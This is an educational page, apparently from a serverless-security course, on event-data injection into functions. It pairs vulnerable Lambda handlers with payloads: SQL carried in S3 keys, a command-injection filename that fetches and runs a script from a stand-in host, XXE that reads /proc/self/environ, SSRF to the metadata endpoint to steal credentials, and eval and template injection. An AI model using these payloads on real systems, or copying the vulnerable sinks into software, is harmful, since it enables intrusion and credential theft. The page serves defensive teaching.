# SAS-1: Function Event-Data Injection - Attack Vectors

## Table of Contents
- [Understanding Event-Data Injection Vectors](#understanding-event-data-injection-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Injection Patterns by Event Source](#injection-patterns-by-event-source)
- [Chaining Injection with Role Privileges](#chaining-injection-with-role-privileges)

## Understanding Event-Data Injection Vectors

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in serverless applications you own or are authorised to test.

An attacker exploiting this weakness is looking for one thing: a function that reads a field from an event and hands it to an interpreter. The clever part is not the payload—SQL, shell, and traversal payloads are decades old—it is **choosing a trigger the developer forgot to treat as hostile**. Because the same handler is often reachable through several triggers, an attacker will deliberately pick the one with the least validation: the S3 upload instead of the API, the queue message instead of the request body.

The attacker's objectives in this category are usually:

- Get an untrusted string into a query, command, path, parser, or outbound request.
- Do it through a non-HTTP trigger, to slip past WAFs and API Gateway validators.
- Leverage the function's IAM role once code or queries execute, to pivot across the account.

### Core Attack Flow

```
1. Map the triggers
   v
   Which sources invoke this function? S3? SNS? SQS? DynamoDB? SES?
2. Find the least-guarded door
   v
   Which trigger's fields are used WITHOUT validation in the handler?
3. Shape the source data
   v
   Upload a crafted key, publish a message, write a row, send an email
4. Fire the sink
   v
   The event field lands in SQL / shell / eval / path / parser / URL
5. Exploit the role
   v
   Use the function's credentials to read secrets and pivot
```

## Injection Patterns by Event Source

### 1. SQL Injection via S3 Object Key

A function subscribed to `s3:ObjectCreated:*` indexes uploads. The object key is chosen by whoever performs the upload.

```bash
# Attacker uploads an object whose KEY is the payload:
aws s3 cp ./x "s3://uploads/report',(SELECT current_user));--.pdf"
```

```python
# Handler (vulnerable):
key = event['Records'][0]['s3']['object']['key']
cur.execute("INSERT INTO files (name, owner) VALUES ('" + key + "', 'sys')")
# The key breaks out of the string literal and injects a subquery.
```

**Payoff**: read/modify database contents through an event source no WAF inspects. Presigned-URL uploads make this reachable by unauthenticated users.

### 2. NoSQL / Operator Injection via Message Body

A consumer builds a DynamoDB or MongoDB filter from a JSON message body.

```javascript
// SQS/SNS message body is JSON the attacker controls:
{ "user": { "$ne": null }, "role": "admin" }

// Handler (vulnerable), MongoDB:
const q = JSON.parse(event.Records[0].body);
const doc = await users.findOne(q);   // {$ne:null} matches the first admin
```

**Payoff**: authentication/filter bypass and mass data selection by injecting query operators the developer never intended to accept.

### 3. OS Command Injection via Filename / Subject

A processor shells out to a CLI tool using a name taken from the event.

```javascript
// SNS Message, S3 key, or SES subject supplies the "filename":
const name = event.Records[0].Sns.Message;   // "a.png; wget evil/s -O /tmp/s; sh /tmp/s"
exec(`convert /tmp/${name} /tmp/out.jpg`);   // shell metacharacters execute
```

```python
# Python equivalent:
os.system("pdftotext /tmp/" + key + " /tmp/out.txt")   # key = "a.pdf; id"
```

**Payoff**: remote code execution inside the function sandbox, immediately followed by access to the role's credentials in the environment.

### 4. Code Injection via `eval` / Dynamic Require

A function evaluates an expression or loads a module named in the event.

```javascript
// EventBridge detail carries an "expression" or "handler" name:
eval(event.detail.expression);               // "require('child_process').execSync('id')"
const mod = require(event.detail.plugin);    // "/tmp/uploaded_payload"
```

```python
# Python:
exec(event['detail']['code'])                # arbitrary Python
handler = __import__(event['detail']['mod']) # dynamic import of attacker value
```

**Payoff**: direct arbitrary-code execution. Dynamic `require`/`import` of an attacker-controlled path is as dangerous as `eval` itself.

### 5. Path Traversal via Object Key or Attachment Name

The function builds a local path from an event-supplied name.

```python
# S3 key or SES attachment filename:
name = event['Records'][0]['s3']['object']['key']   # "../../tmp/../var/task/handler.py"
with open('/var/task/work/' + name, 'wb') as f:     # writes OUTSIDE work/
    f.write(body)

# Reading the wrong file:
open('/mnt/data/' + name).read()   # name = "../../etc/passwd"
```

**Payoff**: overwrite code/config in the writable parts of the environment, or read files outside the intended directory. In Lambda, writing over files the runtime later loads can chain into code execution.

### 6. XXE via Uploaded / Emailed XML

An XML document arrives as an upload, a queue body, or an email, and is parsed with external entities enabled.

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///proc/self/environ">]>
<r>&x;</r>
```

```python
# Vulnerable parse (Python):
from lxml import etree
etree.parse(io.BytesIO(body), etree.XMLParser())   # resolve_entities on by default
```

**Payoff**: read local files (including `/proc/self/environ`, which in Lambda leaks the role credentials injected as environment variables) and pivot to SSRF via `SYSTEM "http://..."` entities.

### 7. SSRF via URL Field in an Event

The function fetches a URL taken from the event body/detail.

```javascript
// URL from EventBridge detail, SNS message, or webhook payload:
const url = event.detail.callbackUrl;
await fetch(url);   // "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"
```

**Payoff**: reach the instance metadata service to steal the execution role's temporary credentials, or hit internal-only endpoints (VPC services, other functions' URLs) the attacker cannot reach directly.

### 8. Log Injection via Unescaped Event Fields

The function writes an event field straight into a log line.

```javascript
// Attacker puts newlines + a forged line into a field:
name = "alice\n{\"level\":\"INFO\",\"msg\":\"admin login ok\"}"
console.log(`processed user=${name}`);   // forges a second, fake log record
```

**Payoff**: forge or corrupt log entries to hide activity or mislead responders. If a CloudWatch Logs subscription forwards those lines to another function, the injected content becomes the *next* function's untrusted input—extending the chain.

### 9. DynamoDB Stream Attribute Injection

A stream consumer reacts to item writes and reuses attribute values in a query or index update.

```python
# Any public API path that writes to the table sets 'bio':
#   bio = "'; UPDATE accounts SET role='admin' WHERE id=1;--"
new_item = event['Records'][0]['dynamodb']['NewImage']
bio = new_item['bio']['S']
warehouse.execute("INSERT INTO profiles(bio) VALUES ('" + bio + "')")
```

**Payoff**: injection into a *downstream* datastore (a warehouse, a search cluster) reachable only from the stream consumer, using data written through an unrelated front door.

### 10. Kinesis / IoT Payload Injection

A record or MQTT message payload is decoded and interpolated into a sink.

```python
# Kinesis record data is base64; decode then trust:
raw = base64.b64decode(event['Records'][0]['kinesis']['data'])
device_id = json.loads(raw)['id']            # "d1'; DROP TABLE readings;--"
cur.execute("INSERT INTO readings(device) VALUES('" + device_id + "')")
```

**Payoff**: high-volume streaming sources let an attacker inject at scale; a spoofed IoT device can publish arbitrary payloads if device identity is weak.

### 11. SES Inbound Email Header/Body Injection

An inbound-mail function parses subject, sender, or body and uses it in a sink.

```python
# SES delivers the message; subject is fully attacker-chosen:
subject = event['Records'][0]['ses']['mail']['commonHeaders']['subject']
# subject = "ticket'); DELETE FROM tickets;--"
cur.execute("INSERT INTO tickets(title) VALUES ('" + subject + "')")
```

**Payoff**: email is the easiest channel to abuse—anyone can send one—yet its fields are rarely treated as injection-grade input.

### 12. Runtime / Downstream-Service Injection

Even when the immediate sink is "safe," an event field can inject into a *downstream* interpreter the function calls: a GraphQL query built by string, an LDAP filter, an OS command in a called microservice, or a template engine (SSTI).

```javascript
// Server-side template rendered from an event field:
const tpl = `Hello ${event.detail.name}`;    // name = "${process.mainModule.require('child_process').execSync('id')}"
render(tpl);                                  // template engine evaluates the expression
```

**Payoff**: the injection surfaces one hop away from the function, making it harder to spot in review and often reaching a service with different (sometimes broader) trust.

## Chaining Injection with Role Privileges

Event-data injection is rarely the whole attack—it is the foothold. The damage is decided by what the function's execution role can do:

```
Command injection via S3 key            -> code runs in the function sandbox
        +
Role has s3:* and secretsmanager:Get*   -> read every bucket and secret
        +
Role can lambda:InvokeFunction / iam:*  -> pivot to other functions, escalate
        =  single upload -> account-wide compromise
```

A second common chain uses metadata theft:

```
SSRF via event URL field  -> fetch 169.254.169.254 metadata
        -> steal the role's temporary credentials
        -> replay them from anywhere with the AWS CLI
        -> act as the function, off-platform, until the credentials expire
```

And an asynchronous chain that frustrates detection:

```
Poison an SQS message through a public producer
        -> consumer executes the payload minutes later
        -> no HTTP request in the access logs to correlate
        -> log injection in the same field hides the consumer's traces
```

## Key Takeaways

1. **Attackers pick the weakest trigger**—usually a non-HTTP one—because that is where validation is missing.
2. **The payloads are classic; the doors are new**—S3 keys, message bodies, stream attributes, and email fields all carry injection just as a request body does.
3. **Asynchronous injection hides**—queue/stream/email vectors leave no HTTP request to point at.
4. **SSRF and XXE steal the role**—both can reach metadata or environment and lift the function's credentials.
5. **The role sets the blast radius**—a foothold plus a broad role equals account compromise; a foothold plus least privilege is a contained bug.

## Next Steps

- **[Prevention Guide](prevention.md)**: Treat every event as untrusted and contain the blast radius
- **[Code Examples](examples.md)**: Vulnerable vs. secure Lambda handlers
- **[Serverless Security Track](/learn/serverless)**: Continue the OWASP Serverless Top 10
- **[Practice Range](/practice)**: Try these vectors hands-on
